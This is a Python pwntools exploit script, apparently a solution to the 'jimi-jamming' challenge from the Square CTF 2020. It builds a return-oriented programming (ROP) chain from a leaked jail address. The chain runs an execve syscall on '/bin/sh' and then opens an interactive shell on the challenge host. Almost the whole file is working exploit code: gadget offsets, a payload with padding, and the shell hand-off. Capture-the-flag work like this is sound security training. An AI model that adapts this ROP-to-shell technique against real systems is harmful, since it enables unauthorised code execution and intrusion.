#!/usr/bin/env python
"""Exploit script template."""
import subprocess
import sys

from pwn import *

context.log_level = 'info'

BINARY = './jimi-jamming'
LIB = './libc.so.6'
HOST = 'challenges.2020.squarectf.com'
PORT = 9001

GDB_COMMANDS = ['c']


def get_ropchain(jail_leak):
    """Returns the ropchain for RCE."""
    pop_rax = jail_leak + 0xdcf  # pop rax; ret;
    pop_rsi = jail_leak + 0xd3f  # pop rsi; ret;
    pop_rdx = jail_leak + 0x7df  # pop rdx; ret;
    pop_rdi = jail_leak + 0xdaf  # pop rdi; ret;

    ropchain = [
        pop_rsi,
        0,
        pop_rdx,
        0,
        pop_rax,
        0x3b,
        pop_rdi,
        jail_leak + 0x2,  # /bin/sh
        jail_leak,  # syscall;
    ]
    return b''.join(map(p64, ropchain))


def exploit(p, mode, libc):
    """Exploit goes here."""
    key = b'\x0f\x05'  # syscall
    key += b'/bin/sh\0'

    index = 0

    p.sendafter('somewhere\n', key)
    p.sendlineafter('key?\n', str(index))

    p.recvuntil('here! ')
    jail_leak = int(p.recvuntil('\n', drop=True), 16)
    log.info(f'Jail @ address 0x{jail_leak:x}')

    if mode == 'debug':
        pause()

    log.info('Sending ropchain')

    payload = p64(0)*4  # Padding
    payload += get_ropchain(jail_leak)  # Ropchain
    payload += p64(jail_leak)*4  # Padding for bounds check
    p.sendline(payload)

    p.recvuntil('JAIL\n')

    p.interactive()


def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <mode>')
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f'Failed to load binary ({BINARY})')

    libc = None
    try:
        libc = ELF(LIB)
        env = os.environ.copy()
        env['LD_PRELOAD'] = LIB
    except IOError:
        print(f'Failed to load library ({LIB})')

    mode = sys.argv[1]

    if mode == 'local':
        p = remote('pwn.local', 2222)
    elif mode == 'debug':
        p = remote('pwn.local', 2223)
        gdb_cmd = ['tmux',
                   'split-window',
                   '-p',
                   '75',
                   'gdb',
                   '-ex',
                   'target remote pwn.local:2224',
                   ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append('-ex')
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == 'remote':
        p = remote(HOST, PORT)
    else:
        print('Invalid mode')
        sys.exit(1)

    exploit(p, mode, libc)

if __name__ == '__main__':

    main()
